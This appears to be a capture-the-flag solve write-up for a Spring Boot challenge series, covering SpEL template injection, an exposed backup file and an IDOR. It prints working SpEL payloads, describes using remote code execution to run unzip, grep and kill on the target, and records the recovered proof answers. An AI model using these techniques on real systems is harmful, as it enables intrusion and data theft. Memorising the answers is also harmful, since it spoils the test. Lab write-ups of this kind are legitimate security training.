---
day: 11
slug: "template-temper"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

# single_solve — Template Temper (Spring Boot SpEL injection)

Target 1: https://2db4cdd021f1636e1999bc0e72e86c55d13b2ec123decacc.2026.huntress.ctf.games/

## Recon

- `GET /` — "Message Mill" Spring Boot analyst workspace, links to `/api/clues`.
- `GET /api/clues` → `{"feature_route":"/process-fbda5a","framework":"Spring Boot","current_role":"analyst"}`
  (evidence/clues.json)
- `GET /process-fbda5a` → `<article><h1>Rendered message</h1><pre></pre></article>` (empty by default).
- Parameter fuzzing found `template` is reflected verbatim (other names: message/text/msg/
  input/content/value/q/query were ignored). `${...}`, `#{...}` and bare math (`7*7`) via
  GET/POST were reflected literally — not evaluated.
- `template={{name}}` (no `name` param) → HTTP 500 Internal Server Error — proof the server
  actively parses `{{...}}` rather than just echoing it.
- `template={{7*7}}` → `49`; `{{1+1}}` → `2`; `{{"test"}}` → `test`;
  `{{T(java.lang.Runtime)}}` → `class java.lang.Runtime` — confirms **Spring SpEL
  (SpelExpressionParser) evaluation** of the `{{ }}`-delimited expression.
  (evidence/*.txt captured via curl during the session.)

## Root cause (from decompiled bytecode, read-only recon, not executed)

Extracted `/app/app.jar` via the SpEL RCE itself (`unzip -qq`) purely to read strings from
`BOOT-INF/classes/ctf/huntress/App.class` (no supplied/challenge code was ever executed by us
beyond stdlib shell utilities for inspection). Key findings from `strings App.class`:

- `HUNTRESS_OBJECTIVE_PATH` env var (default `/run/huntress/objective.txt`) is read, trimmed,
  and bound into a `StandardEvaluationContext` as `setVariable("objective", ...)`.
- The handler regex `\{\{(.+?)}}` extracts the user-supplied `template` parameter's `{{...}}`
  body, feeds it to `SpelExpressionParser.parseExpression(...).getValue(context)`, and splices
  the result back via `Matcher.appendReplacement`/`appendTail` — classic unsandboxed SpEL
  template injection.
- There's also an `x-workspace-role: administrator` gated "framework_authorization_bypassed"
  branch unrelated to this question (403 `administrator_required` otherwise) — not needed for
  `proof-1`.

Because `objective` is a bound SpEL variable, the proof is retrievable **without any command
execution** via the expression `#objective`:

```
GET /process-fbda5a?template=%7B%7B%23objective%7D%7D
→ <article><h1>Rendered message</h1><pre>proof_33c4ab7a98144a7c8022dd592908097c</pre></article>
```

(evidence/objective_response.html)

## Answer

`proof-1` = `proof_33c4ab7a98144a7c8022dd592908097c`

## Notes on cleanup

An early exploration command (`grep -ril proof_ /` without timeout) was left running server-side
after a client-side `curl --max-time` expired; it was visible in `ps aux` as pids 44/45/46 and was
killed with `kill -9 44 45 46` in a later request. No lasting server state was modified; only
read-only recon and `kill` of our own earlier recon process were performed. All target contact
used the cookie jar in `evidence/cookies.txt`, request pacing ~0.8s apart, bounded timeouts
(20-50s), and only the assigned target origin.

## Reusable solver

`solve.py <base_url>` performs the minimal, non-destructive recovery: GET `/api/clues` for the
feature route, then GET `<feature_route>?template={{#objective}}`, and prints the trimmed proof.
This is the generic method — no RCE/file-read required once the binding is known — and should
generalize to other variants of this target (different route suffix, different objective value).

## time_trial

# time_trial — Template Temper

Target 1: https://ce54a213eb5961aee9291522a091f8a8607328253e2927c8.2026.huntress.ctf.games/

Started via `wk.py begin time_trial` as an **untimed regular attempt**: start.json shows
`"deadline": null`, `"run_for_time": false`, `"hall_of_fame_eligible": false`. The target's
own HTTP responses carry an `x-ctf-time-trial-deadline-ms: 7200000` header and the decompiled
`App.class` (see single_solve/NOTES.md) references `HUNTRESS_TIME_TRIAL_DEADLINE_MS` /
`time_trial_expired` — this is the challenge app's own internal simulated timer field embedded
in its code, not a real enforced deadline from the Game Master for this attempt (which is
untimed per `deadline: null`). No `run_for_time:true` was requested; no timed/retry operation
was used.

## Method (same root cause as single_solve)

1. `GET /api/clues` → `{"current_role":"analyst","framework":"Spring Boot","feature_route":"/execute-e45f87"}`
2. `GET /execute-e45f87?template={{#objective}}` (URL-encoded) directly returns the proof bound
   as the SpEL variable `objective` — same Spring SpEL template-injection class documented in
   `single_solve/NOTES.md` (regex `\{\{(.+?)}}` fed into `SpelExpressionParser`).

```
<article><h1>Rendered message</h1><pre>proof_122e4a6f562442e3865ecbc0dab91296</pre></article>
```

(evidence/objective_response.html)

## Answer

`proof-1` = `proof_122e4a6f562442e3865ecbc0dab91296`

## Reusable solver

Reused `single_solve/solve.py` unmodified (curl in this job, since bare `urllib.request` with
no browser-like headers got a Cloudflare 403; curl with default headers succeeded). No RCE was
needed — only the single documented SpEL variable read.

## mastery

# mastery — Template Temper (3 targets, 3 bug classes)

Started via `wk.py begin mastery` as an **untimed regular attempt**: `start.json` shows
`"deadline": null`, `"run_for_time": false`. 3 targets, 3 answer ids (`proof-1`/`proof-2`/
`proof-3`), joined to `questions[].artifact` == `"Target 1"`/`"Target 2"`/`"Target 3"` (not
array order).

Classified each target independently per the carry-forward brief — mastery mixes backup
exposure and IDOR (earlier curriculum classes) with this family's own SpEL template injection.

## Target 1 — "Tiny Uptime" (backup exposure) → proof-1

`https://9df753e1f8841261f532be588dc7b091cb239bd9d73d2e84.2026.huntress.ctf.games/`

- Root page HTML comment: `<!-- deployment note: remember to review crawler policy before
  launch -->`.
- `GET /robots.txt` → `Disallow: /snapshots-011d9/`.
- `GET /snapshots-011d9/` → open directory listing naming
  `environment-copy-e56d72.json.bak` and `release-notes.txt`.
- `GET /snapshots-011d9/environment-copy-e56d72.json.bak` →
  `{"environment":"production","support_note":"proof_c3aeaa86b3e04e9ebd11a27e79a05e8d"}`
  (evidence/t1/environment-copy.json.bak)

**proof-1 = `proof_c3aeaa86b3e04e9ebd11a27e79a05e8d`**

## Target 2 — "Tiny Triage" (IDOR) → proof-2

`https://d8f667134d7adac98d7a2c063f0d75bcf601e737cc5d06ac.2026.huntress.ctf.games/`

- Root page (same cookie jar, session auto-established) lists cases owned by `Riley`
  (2297, 5939, 7717) and links an activity feed at `/api/activity`.
- `GET /api/activity` → events include a foreign-owner entry:
  `{"case_id":17561,"owner":"executive","action":"Case reassigned outside your
  workspace","visibility":"reference_only"}` (evidence/t2/activity.json).
- `GET /tickets/2297` (an owned case) shows the page fetches `/api/tickets/<id>` client-side —
  discloses the object API template `/api/tickets/{id}`.
- `GET /api/tickets/17561` (same cookie jar, no auth change) →
  `{"id":17561,"owner":"executive","title":"Payroll incident","status":"restricted",
  "note":"proof_5e01aed5016a4525b44050eef4ac6a7a"}` (evidence/t2/ticket17561.json) — server
  does not verify the requester owns the case id.

**proof-2 = `proof_5e01aed5016a4525b44050eef4ac6a7a`**

## Target 3 — "Expression Desk" (Spring SpEL template injection, same class as single_solve/time_trial) → proof-3

`https://dbef4e95d1f15e2c4f39e96886d1041260d04d1411d8b9cd.2026.huntress.ctf.games/`

- `GET /api/clues` → `{"current_role":"analyst","feature_route":"/dispatch-46a33a",
  "framework":"Spring Boot"}`.
- Same root cause documented in `single_solve/NOTES.md`: the `template` parameter's
  `{{...}}` body is evaluated with `SpelExpressionParser` against a `StandardEvaluationContext`
  that binds the trimmed objective-file contents as variable `objective`.
- `GET /dispatch-46a33a?template={{#objective}}` →
  `<article><h1>Rendered message</h1><pre>proof_5b8dc1df81ce473e91b47f5e600b5ebe</pre></article>`
  (evidence/t3/objective_response.html)

**proof-3 = `proof_5b8dc1df81ce473e91b47f5e600b5ebe`**

## HTTP discipline

Separate cookie jar per target (evidence/t1, t2, t3), finite timeouts (20s), requests paced
~0.8s apart, only the three assigned target origins contacted, no GM token ever sent to a
target. No command execution was needed for this attempt (the SpEL variable read alone was
sufficient for Target 3).
